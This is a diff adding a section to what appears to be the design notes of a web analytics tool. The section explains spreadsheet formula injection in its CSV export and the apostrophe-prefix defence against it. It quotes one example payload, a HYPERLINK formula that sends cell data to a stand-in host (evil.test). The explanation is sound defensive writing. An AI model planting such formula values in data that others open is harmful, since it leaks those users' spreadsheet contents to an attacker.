@@ -991,6 +991,31 @@ The alternative — adding the Beacon host to `script-src` — works too and is 
 line shorter, but it hands a third-party origin the ability to run code on the
 page. Serving the file yourself does not.
 
+## The export runs in a program that is not this one
+
+The CSV export is built with `csv.writer` rather than by joining commas,
+because a pathname can contain a comma or a quote and hand-rolled CSV corrupts
+itself quietly. That is the right call for the file being *read*, and it does
+nothing about the file being *run*.
+
+Excel, LibreOffice and Sheets treat a cell beginning with `=`, `+`, `-` or `@`
+as a formula. Every dimension value in this export is chosen by a visitor: a
+campaign tag of `=HYPERLINK("http://evil.test/?"&A1,"sale")` needs no access
+beyond loading a page on the site being measured. It passes every gate the
+collector has -- including the URL check, because the URL carrying it really
+is on that site -- and then sits in the analytics until the owner opens their
+export, where it runs as them, against a spreadsheet of their own data.
+
+Quoting is not the fix. `csv.writer` already quotes the cell correctly, and
+Excel strips the quotes and evaluates what was inside. Cells that lead with one
+of those characters are prefixed with an apostrophe, which Excel consumes as
+"this is text" and does not display -- so the owner sees exactly what the
+visitor sent, as text. A plain reader keeps the extra character. That is the
+cheaper of the two costs by a distance.
+
+Numbers are left alone. They cannot lead with one of these, and an apostrophe
+on a count would turn it into a string for every reader downstream.
+
 ## What the log was still writing down
 
 The request log goes out of its way to drop the client address and the query
